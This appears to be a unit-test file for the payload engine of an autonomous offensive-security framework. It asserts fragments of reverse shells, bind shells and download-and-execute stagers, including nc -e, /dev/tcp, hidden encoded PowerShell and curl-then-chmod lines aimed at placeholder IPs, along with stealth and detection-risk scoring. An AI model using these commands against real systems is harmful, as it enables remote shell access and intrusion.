"""Enterprise payload engine tests: reverse/bind/stage synthesis across
platforms and dialects, encoders, capability registration, and the
bind-shell aggressive-only gate."""
import unittest

from phantom.automation.belief import WorldModel
from phantom.automation.brain.payload import PayloadEngine


class TestReverseShell(unittest.TestCase):
    def setUp(self):
        self.eng = PayloadEngine()

    def test_linux_default_dialect(self):
        p = self.eng.reverse("linux", "10.0.0.1", 4444)
        self.assertEqual(p.kind, "reverse")
        self.assertEqual(p.platform, "linux")
        self.assertIn("10.0.0.1", p.command)
        self.assertIn("4444", p.command)

    def test_bash_dialect(self):
        p = self.eng.reverse("linux", "1.2.3.4", 9001, dialect="bash")
        self.assertIn("/dev/tcp/1.2.3.4/9001", p.command)

    def test_python_dialect(self):
        p = self.eng.reverse("linux", "1.2.3.4", 9001, dialect="python3")
        self.assertTrue(p.command.startswith("python3 -c"))
        self.assertIn("1.2.3.4", p.command)

    def test_nc_dialect(self):
        p = self.eng.reverse("linux", "1.2.3.4", 9001, dialect="nc")
        self.assertIn("nc 1.2.3.4 9001 -e", p.command)

    def test_powershell_dialect(self):
        p = self.eng.reverse("windows", "1.2.3.4", 9001, dialect="powershell")
        self.assertIn("powershell -nop -w hidden -Enc", p.command)
        self.assertNotIn("$c=New-Object", p.command)  # base64-encoded

    def test_windows_default_is_powershell(self):
        p = self.eng.reverse("windows", "1.2.3.4", 9001)
        self.assertEqual(p.dialect, "powershell")

    def test_socat_and_openssl_dialects(self):
        p = self.eng.reverse("linux", "1.2.3.4", 9001, dialect="socat")
        self.assertIn("socat TCP:1.2.3.4:9001", p.command)
        p2 = self.eng.reverse("linux", "1.2.3.4", 9001, dialect="openssl")
        self.assertIn("openssl s_client", p2.command)

    def test_base64_encoder(self):
        p = self.eng.reverse("linux", "1.2.3.4", 9001, encoder="base64")
        self.assertTrue(p.command.startswith("echo "))
        self.assertIn("| base64 -d | sh", p.command)


class TestBindShell(unittest.TestCase):
    def setUp(self):
        self.eng = PayloadEngine()

    def test_bind_nc(self):
        p = self.eng.bind("linux", 31337, dialect="nc")
        self.assertEqual(p.kind, "bind")
        self.assertIn("nc -lvp 31337 -e", p.command)

    def test_bind_python(self):
        p = self.eng.bind("linux", 31337, dialect="python3")
        self.assertIn("s.bind(('0.0.0.0',31337))", p.command)

    def test_bind_powershell(self):
        p = self.eng.bind("windows", 31337, dialect="powershell")
        self.assertIn("powershell -nop -w hidden -Enc", p.command)

    def test_bind_options_per_platform(self):
        self.assertIn("nc", self.eng.bind_options("linux"))
        self.assertIn("powershell", self.eng.bind_options("windows"))


class TestStage(unittest.TestCase):
    def test_download_exec_linux(self):
        p = PayloadEngine().download_exec("10.0.0.1", 8080, "b.bin")
        self.assertIn("curl -s http://10.0.0.1:8080/b.bin", p.command)
        self.assertIn("chmod +x", p.command)

    def test_download_exec_windows(self):
        p = PayloadEngine().download_exec("10.0.0.1", 8080, "b.exe",
                                          platform="windows")
        self.assertIn("powershell -nop -w hidden", p.command)
        self.assertIn("Invoke-WebRequest", p.command)

    def test_marker_roundtrip(self):
        p = PayloadEngine().reverse("linux", "1.2.3.4", 4444)
        m = p.marker()
        self.assertTrue(m.startswith("PAYLOAD:reverse:linux:"))


class TestPayloadCapability(unittest.TestCase):
    def test_capabilities_registered(self):
        from phantom.automation.guidance.kit import CAPABILITIES
        ids = {c.id for c in CAPABILITIES}
        self.assertIn("payload_reverse", ids)
        self.assertIn("payload_bind", ids)

    def test_reverse_category_and_effects(self):
        from phantom.automation.guidance.kit import CAPABILITIES
        cap = {c.id: c for c in CAPABILITIES}["payload_reverse"]
        self.assertEqual(cap.category, "payload")
        self.assertIn("shell_foothold", cap.effects)
        self.assertFalse(cap.forceful)

    def test_bind_is_forceful_and_loud(self):
        from phantom.automation.guidance.kit import CAPABILITIES
        cap = {c.id: c for c in CAPABILITIES}["payload_bind"]
        self.assertTrue(cap.forceful)
        self.assertEqual(cap.stealth_level, "aggressive")
        self.assertGreater(cap.detection_risk, 0.85)

    def test_adapter_emits_marker(self):
        from phantom.automation.guidance.kit import (
            _payload_reverse_adapter, _payload_interp)
        wm = WorldModel(target="10.0.0.9")
        wm.add_finding("os", "os:linux",
                       {"os": "linux", "name": "Linux"}, source="os_detect")
        out = _payload_reverse_adapter(wm, {"lhost": "1.2.3.4", "lport": "4444"})
        self.assertTrue(out.startswith("PAYLOAD:reverse:linux:"))
        fs = _payload_interp(out, wm, {})
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0].kind, "shell_foothold")
        self.assertIn("1.2.3.4", fs[0].value["command"])

    def test_bind_adapter_emits_marker(self):
        from phantom.automation.guidance.kit import (
            _payload_bind_adapter, _payload_interp)
        wm = WorldModel(target="10.0.0.9")
        wm.add_finding("os", "os:linux",
                       {"os": "linux", "name": "Linux"}, source="os_detect")
        out = _payload_bind_adapter(wm, {"port": "31337"})
        self.assertTrue(out.startswith("PAYLOAD:bind:linux:"))
        fs = _payload_interp(out, wm, {})
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0].value["kind"], "bind")

    def test_agent_gates_bind_behind_aggressive(self):
        import inspect
        from phantom.automation import agent as agent_mod
        src = inspect.getsource(agent_mod.AutonomousAgent)
        self.assertIn('cap.id == "payload_bind"', src)
        self.assertIn("bind shell requires --aggressive", src)

    def test_phase_index_owns_payload(self):
        from phantom.automation.phases import phase_of
        self.assertEqual(phase_of("payload_reverse"), "foothold")
        self.assertEqual(phase_of("payload_bind"), "foothold")


if __name__ == "__main__":
    unittest.main()